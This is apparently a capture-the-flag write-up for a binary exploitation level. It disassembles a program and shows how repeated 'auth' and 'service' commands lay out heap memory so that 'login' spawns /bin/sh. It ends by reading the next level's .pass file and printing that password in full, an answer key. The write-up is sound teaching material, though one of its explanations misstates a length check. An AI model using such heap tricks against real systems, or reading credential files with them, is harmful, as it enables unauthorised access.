# Level 8

lets disassemlbe the main function and we got

```c
Dump of assembler code for function main:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     push   edi
   0x08048568 <+4>:     push   esi
   0x08048569 <+5>:     and    esp,0xfffffff0
   0x0804856c <+8>:     sub    esp,0xa0
   0x08048572 <+14>:    jmp    0x8048575 <main+17>
   0x08048574 <+16>:    nop
   0x08048575 <+17>:    mov    ecx,DWORD PTR ds:0x8049ab0
   0x0804857b <+23>:    mov    edx,DWORD PTR ds:0x8049aac
   0x08048581 <+29>:    mov    eax,0x8048810
   0x08048586 <+34>:    mov    DWORD PTR [esp+0x8],ecx
   0x0804858a <+38>:    mov    DWORD PTR [esp+0x4],edx
   0x0804858e <+42>:    mov    DWORD PTR [esp],eax
   0x08048591 <+45>:    call   0x8048410 <printf@plt>
   0x08048596 <+50>:    mov    eax,ds:0x8049a80
   0x0804859b <+55>:    mov    DWORD PTR [esp+0x8],eax
   0x0804859f <+59>:    mov    DWORD PTR [esp+0x4],0x80
   0x080485a7 <+67>:    lea    eax,[esp+0x20]
   0x080485ab <+71>:    mov    DWORD PTR [esp],eax
   0x080485ae <+74>:    call   0x8048440 <fgets@plt>
   0x080485b3 <+79>:    test   eax,eax
   0x080485b5 <+81>:    je     0x804872c <main+456>
   0x080485bb <+87>:    lea    eax,[esp+0x20]
   0x080485bf <+91>:    mov    edx,eax
   0x080485c1 <+93>:    mov    eax,0x8048819
   0x080485c6 <+98>:    mov    ecx,0x5
   0x080485cb <+103>:   mov    esi,edx
   0x080485cd <+105>:   mov    edi,eax
   0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080485d1 <+109>:   seta   dl
   0x080485d4 <+112>:   setb   al
   0x080485d7 <+115>:   mov    ecx,edx
   0x080485d9 <+117>:   sub    cl,al
   0x080485db <+119>:   mov    eax,ecx
   0x080485dd <+121>:   movsx  eax,al
   0x080485e0 <+124>:   test   eax,eax
   0x080485e2 <+126>:   jne    0x8048642 <main+222>
   0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4
   0x080485eb <+135>:   call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:   mov    ds:0x8049aac,eax
   0x080485f5 <+145>:   mov    eax,ds:0x8049aac
   0x080485fa <+150>:   mov    DWORD PTR [eax],0x0
   0x08048600 <+156>:   lea    eax,[esp+0x20]
   0x08048604 <+160>:   add    eax,0x5
   0x08048607 <+163>:   mov    DWORD PTR [esp+0x1c],0xffffffff
   0x0804860f <+171>:   mov    edx,eax
   0x08048611 <+173>:   mov    eax,0x0
   0x08048616 <+178>:   mov    ecx,DWORD PTR [esp+0x1c]
   0x0804861a <+182>:   mov    edi,edx
   0x0804861c <+184>:   repnz scas al,BYTE PTR es:[edi]
   0x0804861e <+186>:   mov    eax,ecx
   0x08048620 <+188>:   not    eax
   0x08048622 <+190>:   sub    eax,0x1
   0x08048625 <+193>:   cmp    eax,0x1e
   0x08048628 <+196>:   ja     0x8048642 <main+222>
   0x0804862a <+198>:   lea    eax,[esp+0x20]
   0x0804862e <+202>:   lea    edx,[eax+0x5]
   0x08048631 <+205>:   mov    eax,ds:0x8049aac
   0x08048636 <+210>:   mov    DWORD PTR [esp+0x4],edx
   0x0804863a <+214>:   mov    DWORD PTR [esp],eax
   0x0804863d <+217>:   call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:   lea    eax,[esp+0x20]
   0x08048646 <+226>:   mov    edx,eax
   0x08048648 <+228>:   mov    eax,0x804881f
   0x0804864d <+233>:   mov    ecx,0x5
   0x08048652 <+238>:   mov    esi,edx
   0x08048654 <+240>:   mov    edi,eax
   0x08048656 <+242>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048658 <+244>:   seta   dl
   0x0804865b <+247>:   setb   al
   0x0804865e <+250>:   mov    ecx,edx
   0x08048660 <+252>:   sub    cl,al
   0x08048662 <+254>:   mov    eax,ecx
   0x08048664 <+256>:   movsx  eax,al
   0x08048667 <+259>:   test   eax,eax
   0x08048669 <+261>:   jne    0x8048678 <main+276>
   0x0804866b <+263>:   mov    eax,ds:0x8049aac
   0x08048670 <+268>:   mov    DWORD PTR [esp],eax
   0x08048673 <+271>:   call   0x8048420 <free@plt>
   0x08048678 <+276>:   lea    eax,[esp+0x20]
   0x0804867c <+280>:   mov    edx,eax
   0x0804867e <+282>:   mov    eax,0x8048825
   0x08048683 <+287>:   mov    ecx,0x6
   0x08048688 <+292>:   mov    esi,edx
   0x0804868a <+294>:   mov    edi,eax
   0x0804868c <+296>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804868e <+298>:   seta   dl
   0x08048691 <+301>:   setb   al
   0x08048694 <+304>:   mov    ecx,edx
   0x08048696 <+306>:   sub    cl,al
   0x08048698 <+308>:   mov    eax,ecx
   0x0804869a <+310>:   movsx  eax,al
   0x0804869d <+313>:   test   eax,eax
   0x0804869f <+315>:   jne    0x80486b5 <main+337>
   0x080486a1 <+317>:   lea    eax,[esp+0x20]
   0x080486a5 <+321>:   add    eax,0x7
   0x080486a8 <+324>:   mov    DWORD PTR [esp],eax
   0x080486ab <+327>:   call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:   mov    ds:0x8049ab0,eax
   0x080486b5 <+337>:   lea    eax,[esp+0x20]
   0x080486b9 <+341>:   mov    edx,eax
   0x080486bb <+343>:   mov    eax,0x804882d
   0x080486c0 <+348>:   mov    ecx,0x5
   0x080486c5 <+353>:   mov    esi,edx
   0x080486c7 <+355>:   mov    edi,eax
   0x080486c9 <+357>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>:   seta   dl
   0x080486ce <+362>:   setb   al
   0x080486d1 <+365>:   mov    ecx,edx
   0x080486d3 <+367>:   sub    cl,al
   0x080486d5 <+369>:   mov    eax,ecx
   0x080486d7 <+371>:   movsx  eax,al
   0x080486da <+374>:   test   eax,eax
   0x080486dc <+376>:   jne    0x8048574 <main+16>
   0x080486e2 <+382>:   mov    eax,ds:0x8049aac
   0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:   test   eax,eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
   0x080486fa <+406>:   jmp    0x8048574 <main+16>
   0x080486ff <+411>:   mov    eax,ds:0x8049aa0
   0x08048704 <+416>:   mov    edx,eax
   0x08048706 <+418>:   mov    eax,0x804883b
   0x0804870b <+423>:   mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>:   mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>:   mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>:   mov    DWORD PTR [esp],eax
   0x08048722 <+446>:   call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:   jmp    0x8048574 <main+16>
   0x0804872c <+456>:   nop
   0x0804872d <+457>:   mov    eax,0x0
   0x08048732 <+462>:   lea    esp,[ebp-0x8]
   0x08048735 <+465>:   pop    esi
   0x08048736 <+466>:   pop    edi
   0x08048737 <+467>:   pop    ebp
   0x08048738 <+468>:   ret
End of assembler dump.
```

first we try to print the content of some addresses we found:

```
0x8049ab0 <service>:     ""
0x8049aac <auth>:        ""
0x804883b:       "Password:\n"
0x8048833:       "/bin/sh"
0x804881f:       "reset"
0x804882d:       "login"
```

in this part

```c
   0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080485d1 <+109>:   seta   dl
   0x080485d4 <+112>:   setb   al
   0x080485d7 <+115>:   mov    ecx,edx
   0x080485d9 <+117>:   sub    cl,al
   0x080485db <+119>:   mov    eax,ecx
   0x080485dd <+121>:   movsx  eax,al
   0x080485e0 <+124>:   test   eax,eax
   0x080485e2 <+126>:   jne    0x8048642 <main+222>
   0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4
   0x080485eb <+135>:   call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:   mov    ds:0x8049aac,eax
   0x080485f5 <+145>:   mov    eax,ds:0x8049aac
   0x080485fa <+150>:   mov    DWORD PTR [eax],0x0
   0x08048600 <+156>:   lea    eax,[esp+0x20]
   0x08048604 <+160>:   add    eax,0x5
   0x08048607 <+163>:   mov    DWORD PTR [esp+0x1c],0xffffffff
   0x0804860f <+171>:   mov    edx,eax
   0x08048611 <+173>:   mov    eax,0x0
   0x08048616 <+178>:   mov    ecx,DWORD PTR [esp+0x1c]
   0x0804861a <+182>:   mov    edi,edx
   0x0804861c <+184>:   repnz scas al,BYTE PTR es:[edi]
   0x0804861e <+186>:   mov    eax,ecx
   0x08048620 <+188>:   not    eax
   0x08048622 <+190>:   sub    eax,0x1
   0x08048625 <+193>:   cmp    eax,0x1e
```

there is a cmp between the input and 0x8048819 = `auth ` and then there is another one check the length is equal to 30 `cmp    eax,0x1e`.

```c
   0x08048648 <+228>:   mov    eax,0x804881f
   0x0804864d <+233>:   mov    ecx,0x5
   0x08048652 <+238>:   mov    esi,edx
   0x08048654 <+240>:   mov    edi,eax
   0x08048656 <+242>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048658 <+244>:   seta   dl
   0x0804865b <+247>:   setb   al
   0x0804865e <+250>:   mov    ecx,edx
   0x08048660 <+252>:   sub    cl,al
   0x08048662 <+254>:   mov    eax,ecx
   0x08048664 <+256>:   movsx  eax,al
   0x08048667 <+259>:   test   eax,eax
   0x08048669 <+261>:   jne    0x8048678 <main+276>
   0x0804866b <+263>:   mov    eax,ds:0x8049aac
   0x08048670 <+268>:   mov    DWORD PTR [esp],eax
   0x08048673 <+271>:   call   0x8048420 <free@plt>
```

and then we have an other compare between eax and `0x8048825 = "service"`
if is equal the call strdup if function take string as param and allocate a part of memory for this string.

```c
   0x0804867e <+282>:   mov    eax,0x8048825
   0x08048683 <+287>:   mov    ecx,0x6
   0x08048688 <+292>:   mov    esi,edx
   0x0804868a <+294>:   mov    edi,eax
   0x0804868c <+296>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804868e <+298>:   seta   dl
   0x08048691 <+301>:   setb   al
   0x08048694 <+304>:   mov    ecx,edx
   0x08048696 <+306>:   sub    cl,al
   0x08048698 <+308>:   mov    eax,ecx
   0x0804869a <+310>:   movsx  eax,al
   0x0804869d <+313>:   test   eax,eax
   0x0804869f <+315>:   jne    0x80486b5 <main+337>
   0x080486a1 <+317>:   lea    eax,[esp+0x20]
   0x080486a5 <+321>:   add    eax,0x7
   0x080486a8 <+324>:   mov    DWORD PTR [esp],eax
   0x080486ab <+327>:   call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:   mov    ds:0x8049ab0,eax
```

in This part check if eax equal to `0x804882d = "login"`

```c
   0x080486bb <+343>:   mov    eax,0x804882d
   0x080486c0 <+348>:   mov    ecx,0x5
   0x080486c5 <+353>:   mov    esi,edx
   0x080486c7 <+355>:   mov    edi,eax
   0x080486c9 <+357>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>:   seta   dl
   0x080486ce <+362>:   setb   al
   0x080486d1 <+365>:   mov    ecx,edx
   0x080486d3 <+367>:   sub    cl,al
   0x080486d5 <+369>:   mov    eax,ecx
   0x080486d7 <+371>:   movsx  eax,al
   0x080486da <+374>:   test   eax,eax
   0x080486dc <+376>:   jne    0x8048574 <main+16>
   0x080486e2 <+382>:   mov    eax,ds:0x8049aac
   0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:   test   eax,eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
   0x080486fa <+406>:   jmp    0x8048574 <main+16>
   0x080486ff <+411>:   mov    eax,ds:0x8049aa0
   0x08048704 <+416>:   mov    edx,eax
   0x08048706 <+418>:   mov    eax,0x804883b
   0x0804870b <+423>:   mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>:   mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>:   mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>:   mov    DWORD PTR [esp],eax
   0x08048722 <+446>:   call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:   jmp    0x8048574 <main+16>
   0x0804872c <+456>:   nop

```

the content of `0x8049aac` is "" then check if the value of DWORD PTR [eax+0x20] is "" jmp to <+411> and print "Password:\n" if not they call system and give it "/bin/sh" as param.

```c
   0x080486e2 <+382>:   mov    eax,ds:0x8049aac
   0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:   test   eax,eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
```

so to get the flag we need to fill this part of memory DWORD PTR [eax+0x20] in the auth we cant fill this part cause they check the length so we can use service instead of and change this value.

```
0x8049aac <auth>:       0x0804a008      0x0804a018      0x00000000      0x00000000
0x8049abc:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049acc:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049adc:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049aec:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049afc:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b0c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b1c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b2c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b3c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b4c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b5c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b6c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b7c:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049b8c:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) x/10wx 0x0804a008
0x804a008:      0x41414141      0x0000000a      0x00000000      0x00000011
0x804a018:      0x42424220      0x00000a42      0x00000000      0x00020fe1
0x804a028:      0x00000000      0x00000000
(gdb) x/x 0x0804a008+0x20
0x804a028:      0x00000000
```

so we need to allocate service twice to fill the address 0x0804a008+0x20

```
(nil), (nil)
auth AAAA
0x804a008, (nil)
service BBBB
0x804a008, 0x804a018
service BBBB
0x804a008, 0x804a028
login

Breakpoint 1, 0x080486ea in main ()
(gdb)  x/x 0x0804a008+0x20
0x804a028:      0x42424220
```

and then the program call the system

```
auth AAAA
0x804a008, (nil)
service BBBB
0x804a008, 0x804a018
service BBBB
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
